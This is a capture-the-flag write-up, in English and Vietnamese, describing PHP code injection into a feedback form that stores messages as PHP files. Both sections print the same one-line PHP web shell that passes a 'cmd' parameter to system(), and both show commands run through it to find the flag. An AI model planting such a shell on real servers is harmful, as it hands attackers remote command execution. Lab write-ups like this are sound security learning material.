![image](https://user-images.githubusercontent.com/109911533/221137626-10d76e4a-d796-4d5f-8803-1a6323f5cb9f.png)<br />

Let's take a look at the site.<br />
![image](https://user-images.githubusercontent.com/109911533/221138227-7ddb028a-928e-4445-a59d-5aac16879380.png)<br />

The site said is under construction,but we can write some recommendations to the site with less than 80 characters. Now let's try sending some text to too see what happened.<br ?>

![image](https://user-images.githubusercontent.com/109911533/221139242-2d6d3322-7898-485a-9ade-7f4069bdf147.png)<br />

Looks like the page is running on php. If you visit that url, you can find your message there.<br />
![image](https://user-images.githubusercontent.com/109911533/221139466-1e29c2df-a19c-42f3-91e4-e437071a2110.png)<br />

So what i tried to do here is, i tried sending different messages to see whether it will just be all php. And it is. When sending different messages, the site wil generate a random php file and save the text on it. So, by asking ChatGPPT about this, i know that this website might be vulnerable to php injection.<br />

This is what i used.<br />
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```

Basically, what this command do is: if the website doesn't santize the the "cmd" parameter, this command will execute, giving you a backdoor to the server rev shell. Then you can execute code like a shell it is.<br />
Let's send it to the server.<br />
After sending it to the server, you can now execute code using the cmd parameter ?cmd= "command"<br />
Running the ls command, i see that it dump out all the php file ... i guess it's not random, but rather randomly choose 1 file and save your message in it.Now we know that it is working, we can simply grep it with "grep -r valentine".<br />

![image](https://user-images.githubusercontent.com/109911533/221144963-bd261812-16ad-409f-9ada-097a5903ec08.png)<br />

And there ya go.<br />
___Flag: valentine{n3ver_g0nn4_give_y0u_up}___<br />

---------------------------------------------------------------------------------------------------------------------------------
HÌnh ảnh có thể xem lại ở trên<br />

Bài này là về php injection.<br />
Thì đầu tiên, bài này đang kêu chúng ta gửi một tin nhắn đến trang web để có thể đưa ra ý kiến về trang web nên như thế nào.<br />

Thì gửi thử "hello bro" tới server, ta thấy web thông báo là tin nhắn của chúng ta được lưu ở một file php. Nên tui đã làm là thử gửi nhiều tin nhắn để xem như thế nào, thì tui thấy là mỗi một tin nhắn sẽ được lưu ở một file php random khác nhau, nên có thể nghĩ theo hướng là php injection.<br />

Thì tui đã sử dụng một command khá là phổ biến có sẵn trên mạng, là:<br />
```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
Command này được sử dụng khi một web không sử lý những thông tin được input, nếu biến "cmd" không được xử lý kỹ có thể dẫn tới việc chiếm shell web, từ đó có thể thực thi các lệnh trên trang web như là 1 shell. Có thể đọc ở đây: https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/<br />

Gửi lệnh này tới server, sau đó nhận thông báo là tin nhắn được lưu ở một trang, truy cập trang web đó, ta có thể bắt đầu sử dụng các command với parameter ?cmd= command<br />
Sử dụng lệnh ?cmd=ls ta có thể list ra tất cả các file thì có thể thấy có rất nhiều file php, và không có file flag hay flag.txt, nên có thể flag đã nằm một trong những file php.<br />

Nếu xài lệnh cat để kiểm tra thì sẽ rất lâu cho từng file, nên sử dụng lệnh ?cmd=grep -r valentine.<br />
Grep sẽ như một ctrl F, -r(recursively) sẽ là lệnh để tìm liên tục, kiểu như scan từng file một để tìm cho ta chuỗi "valentine". Sau đó nó sẽ in ra tên file chứa chuỗi đó + chuỗi đó.
Và ta có flag.



